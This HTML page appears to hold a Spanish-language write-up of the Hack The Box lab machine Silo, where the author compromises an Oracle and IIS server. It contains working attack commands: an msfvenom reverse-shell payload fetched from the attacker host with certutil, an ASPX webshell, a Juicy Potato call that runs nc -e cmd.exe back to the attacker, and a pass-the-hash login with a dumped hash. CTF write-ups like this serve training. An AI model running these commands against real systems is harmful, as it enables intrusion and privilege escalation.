<!doctype html><html lang=es dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Hack The Box - Silo | Román Zuleta</title>
<meta name=keywords content="HTB - Medium,Microsoft IIS,Oracle TNS Listener,Oracle BD,ODAT,sqlplus,forensics,Juicy Potato,volatility">
<meta name=description content="Write-up de la máquina Silo de la plataforma hackthebox.eu">
<meta name=author content="Román Zuleta">
<link rel=canonical href=https://rzul.me/posts/htb-silo/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css integrity="sha256-7I2jZsovtkdTfMt6j2+ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://rzul.me/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://rzul.me/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://rzul.me/favicon-32x32.png>
<link rel=apple-touch-icon href=https://rzul.me/apple-touch-icon.png>
<link rel=mask-icon href=https://rzul.me/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<link rel=alternate hreflang=es href=https://rzul.me/posts/htb-silo/>
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript><meta property="og:title" content="Hack The Box - Silo">
<meta property="og:description" content="Write-up de la máquina Silo de la plataforma hackthebox.eu">
<meta property="og:type" content="article">
<meta property="og:url" content="https://rzul.me/posts/htb-silo/">
<meta property="og:image" content="https://rzul.me/images/posts/htb-silo/cover_silo.jpg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-05-27T20:01:34-05:00">
<meta property="article:modified_time" content="2022-05-27T20:01:34-05:00">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://rzul.me/images/posts/htb-silo/cover_silo.jpg">
<meta name=twitter:title content="Hack The Box - Silo">
<meta name=twitter:description content="Write-up de la máquina Silo de la plataforma hackthebox.eu">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://rzul.me/posts/"},{"@type":"ListItem","position":2,"name":"Hack The Box - Silo","item":"https://rzul.me/posts/htb-silo/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - Silo","name":"Hack The Box - Silo","description":"Write-up de la máquina Silo de la plataforma hackthebox.eu","keywords":["HTB - Medium","Microsoft IIS","Oracle TNS Listener","Oracle BD","ODAT","sqlplus","forensics","Juicy Potato","volatility"],"articleBody":"Estadísticas    Característica Descripción     Nombre Silo   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores egre55    Reconocimiento Escaneo de host Escaneo completo de puertos └─$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET [sudo] password for srrequiem: Sorry, try again. [sudo] password for srrequiem: Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 23:09 EDT Initiating SYN Stealth Scan at 23:09 Scanning 10.10.10.82 [65535 ports] Discovered open port 80/tcp on 10.10.10.82 Discovered open port 445/tcp on 10.10.10.82 Discovered open port 139/tcp on 10.10.10.82 Discovered open port 135/tcp on 10.10.10.82 Discovered open port 49161/tcp on 10.10.10.82 Discovered open port 49155/tcp on 10.10.10.82 Discovered open port 49162/tcp on 10.10.10.82 Discovered open port 49154/tcp on 10.10.10.82 Discovered open port 49160/tcp on 10.10.10.82 Discovered open port 47001/tcp on 10.10.10.82 Discovered open port 49153/tcp on 10.10.10.82 Discovered open port 49159/tcp on 10.10.10.82 Discovered open port 49152/tcp on 10.10.10.82 Discovered open port 5985/tcp on 10.10.10.82 Discovered open port 1521/tcp on 10.10.10.82 Completed SYN Stealth Scan at 23:09, 13.20s elapsed (65535 total ports) Nmap scan report for 10.10.10.82 Host is up, received user-set (0.064s latency). Scanned at 2022-05-23 23:09:27 EDT for 14s Not shown: 65520 closed tcp ports (reset) PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 1521/tcp open oracle syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49152/tcp open unknown syn-ack ttl 127 49153/tcp open unknown syn-ack ttl 127 49154/tcp open unknown syn-ack ttl 127 49155/tcp open unknown syn-ack ttl 127 49159/tcp open unknown syn-ack ttl 127 49160/tcp open unknown syn-ack ttl 127 49161/tcp open unknown syn-ack ttl 127 49162/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds Raw packets sent: 65634 (2.888MB) | Rcvd: 65535 (2.621MB) Escaneo específico └─$ nmap -sCV -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 23:11 EDT Nmap scan report for 10.10.10.82 Host is up (0.065s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/8.5 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49159/tcp open oracle-tns Oracle TNS listener (requires service name) 49160/tcp open msrpc Microsoft Windows RPC 49161/tcp open msrpc Microsoft Windows RPC 49162/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.0.2: |_ Message signing enabled but not required | smb2-time: | date: 2022-05-24T03:13:17 |_ start_date: 2022-05-24T02:53:36 | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: supported Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 127.10 seconds Enumeración Servicios Microsoft IIS - 80 Se expone la página por default de Microsoft IIS y al hacer uso de herramientas de fuzzing no se tuvo éxito al buscar algún directorio relevante, sin embargo, para el método intencionado de resolución es importante tener a consideración.\nOracle TNS Listener - 1521 Después de revisar acerca de la metodología empleada para este servicio, se buscó obtener información relevante respecto la versión, estatus, etc, haciendo uso de tnscmd10g sin éxito alguno.\nPosteriormente, en la metodología se mencionan los SID (Identificadores de Servicio, esencialmente pueden ser reconocidos como los nombres de las bases de datos), los cuales dependiendo de la instalación realizada pueden existir uno o más SIDs por defecto. Al no poder obtenerlos mediante tnscmd10g, se sugiere que realice fuerza bruta de los comúnes para identificar los existentes.\nhydra Haciendo uso de hydra -L content/sids-oracle.txt -s 1521 10.10.10.82 oracle-sid con el conjunto de diccionarios que ofrece hacktricks (el cual es un compendio de las listas de nmap y metasploit), se identificaron los SIDs:\n CLRExtProc. PLSExtProc. XE.  Explotación Nota: Después de resolver la máquina se suele verificar el proceso con otras fuentes, identificando de esta manera que existen 2 caminos a resolver la máquina una intencionada y una no intencionada, una más directa por no decir fácil que la otra. Primero se expondrá el método por el cuál se resolvió inicialmente y posteriormente la resolución intencionada.\nNo intencionada Obtención de credenciales Pasos previos | Preparación Haciendo uso de ODAT se obtuvieron credenciales de un usuario disponible, por medio de un módulo que la herramienta ofrece. Inicialmente se requiere la instalación descrita en el repositorio aunque por lo que respecta en kali, basta con clonar el repositorio.\nEjecución Como parte inicial se ejecutó un “Ave María” invocando todos los módulos que la herramienta ofrece para visualizar si de esta manera se identificaba algo que pudiera servir, para ello, la herramienta solicita un SID válido a ocupar, siendo XE el SID con información útil (identificándolo después de ejecutar el comando con cada uno de los SIDs). Haciendo uso de ./odat.py all -s 10.10.10.82 -p 1521 -d XE.\nPosteriormente se identificó que el módulo encargado de hacer este proceso es passwordguesser el cual simplemente sustituiría a all del comando.\nRCE Pasos previos | Preparación Posteriormente, al revisar los módulos disponibles se identificó que tanto el módulo dbmsscheduler como el módulo externaltable ofrecen capacidad de ejecutar comandos. Que al intentar usarlos no se permitió su ejecución debido a la falta de privilegios, sin embargo, se encontró que mediante la bandera --sysdba existe la posibilidad de “escalar” estos privilegios o impersonar un rol superior al que se tenía.\nEjecución Obteniendo así, una vez ejecutada la reverse shell, acceso directamente como administrador.\n Creando un payload con msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1234 -f exe  pwn.exe. Descargándolo con ./odat.py dbmsscheduler -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec \"certutil.exe -f -urlcache -split http://10.10.14.16/pwn.exe c:\\windows\\temp\\pwn.exe\" --sysdba. Y ejecutándolo con ./odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec \"c:\\windows\\temp\" \"pwn.exe\" --sysdba.  Intencionada Si bien odat permite la lectura, escritura y ejecución de archivos, todo lo que realiza en estos procesos no resulta tan “transparente” por lo que para entender un poco acerca de Oracle se realizo parte del mismo proceso por medio de SQL directamente.\nNota: Se da por hecho que se realizo el descubrimiento de los SIDs y de las credenciales válidas, dado que scott:tiger son credenciales por default.\nRCE Pasos previos | Preparación Como parte de la instalación de odat, se realiza la instalación del cliente sql para conectarse a la base de datos de Oracle.\nPor lo que una vez instalado se permite la conexión al host por medio de sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba.\nEjecución Oracle ocupa su propia sintaxis por lo que con el siguiente pedazo de código se buscó obtener el contenido del archivo por defecto del servidor. Buscando obtener respuesta por medio del prompt configurando primeramente set serveroutput ON para su visualización.\ndeclare f utl_file.file_type; s varchar(200); begin f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R'); utl_file.get_line(f,s); utl_file.fclose(f); dbms_output.put_line(s); end; Por otra parte se puede verificar que también exista la capacidad de escribir a un archivo, verificándolo con el siguiente segmento de código.\ndeclare f utl_file.file_type; s varchar(5000) := 'Hello world'; begin f := utl_file.fopen('/inetpub/wwwroot', 'srrequiem.txt', 'W'); utl_file.put_line(f,s); utl_file.fclose(f); end; Una vez validada la escritura, se abre la puerta a la creación de una reverse shell, el inconveniente es que debido al espacio limitado en las variables respecto a los caracteres no fue posible llevarlo a cabo, por lo que se optó por una webshell en su lugar.\nUtilizando /usr/share/webshells/aspx/cmdasp.aspx eliminando estilos, comentarios y saltos de línea para reducir los caracteres se obtuvo ejecución en la máquina.\nCódigo de página empleado:\n@ Page Language=\"C#\" Debug=\"true\" Trace=\"false\" %@ Import Namespace=\"System.Diagnostics\" %@ Import Namespace=\"System.IO\" %\"c#\" runat=\"server\"void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = \"cmd.exe\";psi.Arguments = \"/c \"+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(\"\");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(\"\");}\"cmd\" method=\"post\" runat=\"server\"\"txtArg\" runat=\"server\" Width=\"250px\"\"testing\" runat=\"server\" Text=\"excute\" OnClick=\"cmdExe_Click\"\"lblText\" runat=\"server\"Command: Post Explotación Enumeración Se identificó que entre los privilegios disponibles del usuario obtenido se encuentra habilitado SeImpersonatePrivilege lo que lleva a un camino de escalación de privilegios por medio de Rotten o JuicyPotato.\nSe identificó un archivo accesible en el escritorio de uno de los usuarios del sistema c:\\users\\phineas\\desktop\\oracle issue.txt el cual indica que se trata de un dumpeo de memoria del sistema.\nContenido:\nSupport vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested): Dropbox link provided to vendor (and password under separate cover). Dropbox link https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0 link password: £%Hm8646uC$ Nota: Cabe recalcar que el caracter £ puede que no se interprete correctamente si se optó por entablar una reverse shell, causando su omisión y por consiguiente, que a la hora de la descarga indique que la contraseña no es válida. Teniendo que realizar un procesado extra (ejemplo base64) para extraer su contenido. Accediendo al archivo por medio de la webshell no existió este problema\nEscalación de privilegios Método 1 - Juicy Potato Habiendo encontrado los privilegios relacionados con este método de escalación, sólo restaría probar su ejecución mediante el binario y con las opciones utilizadas para entablar una reverse shell con permisos elevados NT AUTHORITY\\SYSTEM.\n.\\jp.exe -t * -l 1337 -p c:\\windows\\temp\\nc.exe -a \" -e cmd.exe 10.10.14.16 4321\"\nCon lo que respecta a los argumentos utilizados, el binario mismo da la descripción de cada uno de ellos.\nCon lo que respecta a la práctica los argumentos -t y -l no representa algo sustancial el cambiar valores. Y en donde -p (programa a ejecutar) y -a (argumentos a utilizar por el programa señalado) se usaron a partir de las herramientas usadas en pasos anteriores.\nMétodo 2 - Memdump Con la copia de memoria descargada, se puede hacer uso de volatility para analizarla. Buscando antes que todo un perfil acorde al perteneciente al dumpeo de memoria, por medio de ./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp imageinfo teniendo en cuenta que debido al acceso previamente obtenido se puede buscar un perfil más adecuado.\nEjecutando systeminfo en la máquina se pueden comparar resultados, identificando el perfil Win2012R2x64 como el más adecuado.\nHaciendo uso del plugin hashdump se pueden obtener los hashes del sistema, exponiendo de esta manera una forma de acceder a la máquina como el usuario Administrator. Por medio de ./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp --profile=Win2012R2x64 hashdump.\nObteniendo acceso haciendo uso del hash con impacket-psexec Administrator@10.10.10.82 -hashes :9e730375b7cbcebf74ae46481e07b0c7.\nReferencias  Hack Tricks - Pentesting Oracle TNS Listener. odat.py. 0xdf Write-up. Ippsec Walkthrough. PayloadAllTheThings - JuicyPotato. Binarios Juicy Potato. Releases Volatility. Github Volatility.  ","wordCount":"1832","inLanguage":"es","image":"https://rzul.me/images/posts/htb-silo/cover_silo.jpg","datePublished":"2022-05-27T20:01:34-05:00","dateModified":"2022-05-27T20:01:34-05:00","author":{"@type":"Person","name":"Román Zuleta"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rzul.me/posts/htb-silo/"},"publisher":{"@type":"Organization","name":"Román Zuleta","logo":{"@type":"ImageObject","url":"https://rzul.me/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://rzul.me/ accesskey=h title="Román Zuleta (Alt + H)">Román Zuleta</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
<ul class=lang-switch><li>|</li>
<li>
<a href=https://rzul.me/en/ title=English aria-label=English>En</a>
</li>
</ul>
</span>
</div>
<ul id=menu>
<li>
<a href=https://rzul.me/archives/ title=Archivo>
<span>Archivo</span>
</a>
</li>
<li>
<a href=https://rzul.me/categories/ title=Categorías>
<span>Categorías</span>
</a>
</li>
<li>
<a href=https://rzul.me/tags/ title=Etiquetas>
<span>Etiquetas</span>
</a>
</li>
<li>
<a href=https://rzul.me/search/ title="Buscar (Alt + /)" accesskey=/>
<span>Buscar</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://rzul.me/>Inicio</a>&nbsp;»&nbsp;<a href=https://rzul.me/posts/>Posts</a></div>
<h1 class=post-title>
Hack The Box - Silo
</h1>
<div class=post-description>
Write-up de la máquina Silo de la plataforma hackthebox.eu
</div>
<div class=post-meta><span title="2022-05-27 20:01:34 -0500 CDT">mayo 27, 2022</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Román Zuleta&nbsp;|&nbsp;<a href=https://github.com/srrequiem/SecNotes/blob/main/HTB/Boxes/Windows/2_Medium/Silo rel="noopener noreferrer" target=_blank>Sugerir cambios</a>
</div>
</header>
<figure class=entry-cover><img loading=lazy src=https://rzul.me/images/posts/htb-silo/cover_silo.jpg alt="Silo cover">
<p></p>
</figure><div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Tabla de Contenidos</span>
</summary>
<div class=inner><ul>
<li>
<a href=#estad%c3%adsticas aria-label=Estadísticas>Estadísticas</a></li>
<li>
<a href=#reconocimiento aria-label=Reconocimiento>Reconocimiento</a><ul>
<li>
<a href=#escaneo-de-host aria-label="Escaneo de host">Escaneo de host</a><ul>
<li>
<a href=#escaneo-completo-de-puertos aria-label="Escaneo completo de puertos">Escaneo completo de puertos</a></li>
<li>
<a href=#escaneo-espec%c3%adfico aria-label="Escaneo específico">Escaneo específico</a></li></ul>
</li></ul>
</li>
<li>
<a href=#enumeraci%c3%b3n aria-label=Enumeración>Enumeración</a><ul>
<li>
<a href=#servicios aria-label=Servicios>Servicios</a><ul>
<li>
<a href=#microsoft-iis---80 aria-label="Microsoft IIS - 80">Microsoft IIS - 80</a></li>
<li>
<a href=#oracle-tns-listener---1521 aria-label="Oracle TNS Listener - 1521">Oracle TNS Listener - 1521</a><ul>
<li>
<a href=#hydra aria-label=hydra>hydra</a></li></ul>
</li></ul>
</li></ul>
</li>
<li>
<a href=#explotaci%c3%b3n aria-label=Explotación>Explotación</a><ul>
<li>
<a href=#no-intencionada aria-label="No intencionada">No intencionada</a><ul>
<li>
<a href=#obtenci%c3%b3n-de-credenciales aria-label="Obtención de credenciales">Obtención de credenciales</a><ul>
<li>
<a href=#pasos-previos--preparaci%c3%b3n aria-label="Pasos previos | Preparación">Pasos previos | Preparación</a></li>
<li>
<a href=#ejecuci%c3%b3n aria-label=Ejecución>Ejecución</a></li></ul>
</li>
<li>
<a href=#rce aria-label=RCE>RCE</a><ul>
<li>
<a href=#pasos-previos--preparaci%c3%b3n-1 aria-label="Pasos previos | Preparación">Pasos previos | Preparación</a></li>
<li>
<a href=#ejecuci%c3%b3n-1 aria-label=Ejecución>Ejecución</a></li></ul>
</li></ul>
</li>
<li>
<a href=#intencionada aria-label=Intencionada>Intencionada</a><ul>
<li>
<a href=#rce-1 aria-label=RCE>RCE</a><ul>
<li>
<a href=#pasos-previos--preparaci%c3%b3n-2 aria-label="Pasos previos | Preparación">Pasos previos | Preparación</a></li>
<li>
<a href=#ejecuci%c3%b3n-2 aria-label=Ejecución>Ejecución</a></li></ul>
</li></ul>
</li></ul>
</li>
<li>
<a href=#post-explotaci%c3%b3n aria-label="Post Explotación">Post Explotación</a><ul>
<li>
<a href=#enumeraci%c3%b3n-1 aria-label=Enumeración>Enumeración</a></li>
<li>
<a href=#escalaci%c3%b3n-de-privilegios aria-label="Escalación de privilegios">Escalación de privilegios</a><ul>
<li>
<a href=#m%c3%a9todo-1---juicy-potato aria-label="Método 1 - Juicy Potato">Método 1 - Juicy Potato</a></li>
<li>
<a href=#m%c3%a9todo-2---memdump aria-label="Método 2 - Memdump">Método 2 - Memdump</a></li></ul>
</li></ul>
</li>
<li>
<a href=#referencias aria-label=Referencias>Referencias</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h1 id=estadísticas>Estadísticas<a hidden class=anchor aria-hidden=true href=#estadísticas>#</a></h1>
<table>
<thead>
<tr>
<th>Característica</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr>
<td>Nombre</td>
<td><a href=https://www.hackthebox.com/home/machines/profile/131>Silo</a></td>
</tr>
<tr>
<td>OS</td>
<td>Windows</td>
</tr>
<tr>
<td>Dificultad oficial</td>
<td>Medium</td>
</tr>
<tr>
<td>Dificultad de comunidad</td>
<td><img loading=lazy src=/images/posts/htb-silo/difficulty.png alt=Dificultad>
</td>
</tr>
<tr>
<td>Puntos</td>
<td>30</td>
</tr>
<tr>
<td>Creadores</td>
<td><a href=https://www.hackthebox.com/home/users/profile/1190>egre55</a></td>
</tr>
</tbody>
</table>
<h1 id=reconocimiento>Reconocimiento<a hidden class=anchor aria-hidden=true href=#reconocimiento>#</a></h1>
<h2 id=escaneo-de-host>Escaneo de host<a hidden class=anchor aria-hidden=true href=#escaneo-de-host>#</a></h2>
<h3 id=escaneo-completo-de-puertos>Escaneo completo de puertos<a hidden class=anchor aria-hidden=true href=#escaneo-completo-de-puertos>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└─$ sudo nmap -sS --min-rate <span style=color:#ae81ff>5000</span> -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> srrequiem:
Sorry, try again.
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> srrequiem:
Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times may be slower.
Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-05-23 23:09 EDT
Initiating SYN Stealth Scan at 23:09
Scanning 10.10.10.82 <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
Discovered open port 80/tcp on 10.10.10.82
Discovered open port 445/tcp on 10.10.10.82
Discovered open port 139/tcp on 10.10.10.82
Discovered open port 135/tcp on 10.10.10.82
Discovered open port 49161/tcp on 10.10.10.82
Discovered open port 49155/tcp on 10.10.10.82
Discovered open port 49162/tcp on 10.10.10.82
Discovered open port 49154/tcp on 10.10.10.82
Discovered open port 49160/tcp on 10.10.10.82
Discovered open port 47001/tcp on 10.10.10.82
Discovered open port 49153/tcp on 10.10.10.82
Discovered open port 49159/tcp on 10.10.10.82
Discovered open port 49152/tcp on 10.10.10.82
Discovered open port 5985/tcp on 10.10.10.82
Discovered open port 1521/tcp on 10.10.10.82
Completed SYN Stealth Scan at 23:09, 13.20s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.82
Host is up, received user-set <span style=color:#f92672>(</span>0.064s latency<span style=color:#f92672>)</span>.
Scanned at 2022-05-23 23:09:27 EDT <span style=color:#66d9ef>for</span> 14s
Not shown: <span style=color:#ae81ff>65520</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl <span style=color:#ae81ff>127</span>
135/tcp   open  msrpc        syn-ack ttl <span style=color:#ae81ff>127</span>
139/tcp   open  netbios-ssn  syn-ack ttl <span style=color:#ae81ff>127</span>
445/tcp   open  microsoft-ds syn-ack ttl <span style=color:#ae81ff>127</span>
1521/tcp  open  oracle       syn-ack ttl <span style=color:#ae81ff>127</span>
5985/tcp  open  wsman        syn-ack ttl <span style=color:#ae81ff>127</span>
47001/tcp open  winrm        syn-ack ttl <span style=color:#ae81ff>127</span>
49152/tcp open  unknown      syn-ack ttl <span style=color:#ae81ff>127</span>
49153/tcp open  unknown      syn-ack ttl <span style=color:#ae81ff>127</span>
49154/tcp open  unknown      syn-ack ttl <span style=color:#ae81ff>127</span>
49155/tcp open  unknown      syn-ack ttl <span style=color:#ae81ff>127</span>
49159/tcp open  unknown      syn-ack ttl <span style=color:#ae81ff>127</span>
49160/tcp open  unknown      syn-ack ttl <span style=color:#ae81ff>127</span>
49161/tcp open  unknown      syn-ack ttl <span style=color:#ae81ff>127</span>
49162/tcp open  unknown      syn-ack ttl <span style=color:#ae81ff>127</span>

Read data files from: /usr/bin/../share/nmap
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 13.27 seconds
           Raw packets sent: <span style=color:#ae81ff>65634</span> <span style=color:#f92672>(</span>2.888MB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>65535</span> <span style=color:#f92672>(</span>2.621MB<span style=color:#f92672>)</span>
</code></pre></div><h3 id=escaneo-específico>Escaneo específico<a hidden class=anchor aria-hidden=true href=#escaneo-específico>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└─$ nmap -sCV -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-05-23 23:11 EDT
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.82
Host is up <span style=color:#f92672>(</span>0.065s latency<span style=color:#f92672>)</span>.

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server <span style=color:#ae81ff>2008</span> R2 - <span style=color:#ae81ff>2012</span> microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 <span style=color:#f92672>(</span>unauthorized<span style=color:#f92672>)</span>
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style=color:#f92672>(</span>SSDP/UPnP<span style=color:#f92672>)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style=color:#f92672>(</span>SSDP/UPnP<span style=color:#f92672>)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener <span style=color:#f92672>(</span>requires service name<span style=color:#f92672>)</span>
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server <span style=color:#ae81ff>2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.0.2:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-05-24T03:13:17
|_  start_date: 2022-05-24T02:53:36
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
